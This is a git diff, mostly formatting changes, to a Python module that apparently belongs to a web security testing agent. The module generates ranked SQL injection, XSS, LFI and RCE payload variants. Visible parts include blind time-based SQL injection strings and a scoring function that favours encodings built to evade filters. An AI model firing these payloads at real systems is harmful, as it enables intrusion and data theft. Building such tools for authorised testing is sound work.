@@ -33,7 +33,6 @@ from typing import Iterator, List, Optional
 
 from amoskys.agents.Web.argos.evasion import encode
 
-
 # ── SQL injection variants ────────────────────────────────────────
 
 
@@ -53,8 +52,8 @@ _SQLI_TIMING = (
     "' AND IF(1=1,SLEEP(4),0)-- -",
     "' OR BENCHMARK(5000000,MD5(1))-- -",
     "' AND (SELECT SLEEP(4))-- -",
-    "'; WAITFOR DELAY '0:0:4'-- -",   # MSSQL
-    "' AND pg_sleep(4)-- -",           # Postgres
+    "'; WAITFOR DELAY '0:0:4'-- -",  # MSSQL
+    "' AND pg_sleep(4)-- -",  # Postgres
     "' AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 0 END)-- -",  # div-by-zero blind
 )
 
@@ -72,12 +71,18 @@ def _rank(variant: str) -> int:
     Reward: comment usage, hex encoding, case mutation, url2 double-enc.
     """
     score = 0
-    if "/*" in variant:        score += 3
-    if "%25" in variant:       score += 3
-    if "%u" in variant:        score += 2
-    if "%00" in variant:       score += 1
+    if "/*" in variant:
+        score += 3
+    if "%25" in variant:
+        score += 3
+    if "%u" in variant:
+        score += 2
+    if "%00" in variant:
+        score += 1
     alpha = [c for c in variant if c.isalpha()]
-    if alpha and not (all(c.isupper() for c in alpha) or all(c.islower() for c in alpha)):
+    if alpha and not (
+        all(c.isupper() for c in alpha) or all(c.islower() for c in alpha)
+    ):
         score += 2  # mixed case
     # Penalize variants that contain obvious red-flag literals.
     for red in ("OR 1=1", "' OR '1'='1", "UNION SELECT"):
@@ -86,10 +91,12 @@ def _rank(variant: str) -> int:
     return score
 
 
-def sqli_variants(base: Optional[str] = None,
-                  mode: str = "timing",
-                  max_variants: int = 60,
-                  seed: Optional[int] = None) -> List[str]:
+def sqli_variants(
+    base: Optional[str] = None,
+    mode: str = "timing",
+    max_variants: int = 60,
+    seed: Optional[int] = None,
+) -> List[str]:
     """Produce ranked SQLi payload variants.
 
     mode: "timing" (blind), "tautology", "union", or "all".
@@ -99,9 +106,12 @@ def sqli_variants(base: Optional[str] = None,
     if base:
         bases.append(base)
     else:
-        if mode in ("timing", "all"):     bases.extend(_SQLI_TIMING)
-        if mode in ("tautology", "all"):  bases.extend(_SQLI_TAUTOLOGIES)
-        if mode in ("union", "all"):      bases.extend(_SQLI_UNION)
+        if mode in ("timing", "all"):
+            bases.extend(_SQLI_TIMING)
+        if mode in ("tautology", "all"):
+            bases.extend(_SQLI_TAUTOLOGIES)
+        if mode in ("union", "all"):
+            bases.extend(_SQLI_UNION)
 
     out: set = set()
     for b in bases:
@@ -146,9 +156,9 @@ _XSS_BASE = (
 )
 
 
-def xss_variants(base: Optional[str] = None,
-                 max_variants: int = 50,
-                 seed: Optional[int] = None) -> List[str]:
+def xss_variants(
+    base: Optional[str] = None, max_variants: int = 50, seed: Optional[int] = None
+) -> List[str]:
     rng = random.Random(seed) if seed is not None else random.Random()
     bases: List[str] = [base] if base else list(_XSS_BASE)
     out: set = set()
@@ -193,9 +203,9 @@ _LFI_BASE = (
 )
 
 
-def lfi_variants(base: Optional[str] = None,
-                 depth: int = 6,
-                 max_variants: int = 50) -> List[str]:
+def lfi_variants(
+    base: Optional[str] = None, depth: int = 6, max_variants: int = 50
+) -> List[str]:
     bases: List[str] = [base] if base else list(_LFI_BASE)
     traversal = "../" * depth
     out: set = set()
@@ -240,8 +250,7 @@ _RCE_BASE = (
 )
 
 
-def rce_variants(base: Optional[str] = None,
-                 max_variants: int = 40) -> List[str]:
+def rce_variants(base: Optional[str] = None, max_variants: int = 40) -> List[str]:
     bases: List[str] = [base] if base else list(_RCE_BASE)
     out: set = set()
     for b in bases:
@@ -271,9 +280,9 @@ def variant_stream(kind: str, **kw) -> Iterator[str]:
     to stop early (e.g., first variant that gets a 200 response)."""
     fns = {
         "sqli": sqli_variants,
-        "xss":  xss_variants,
-        "lfi":  lfi_variants,
-        "rce":  rce_variants,
+        "xss": xss_variants,
+        "lfi": lfi_variants,
+        "rce": rce_variants,
     }
     fn = fns.get(kind)
     if not fn:
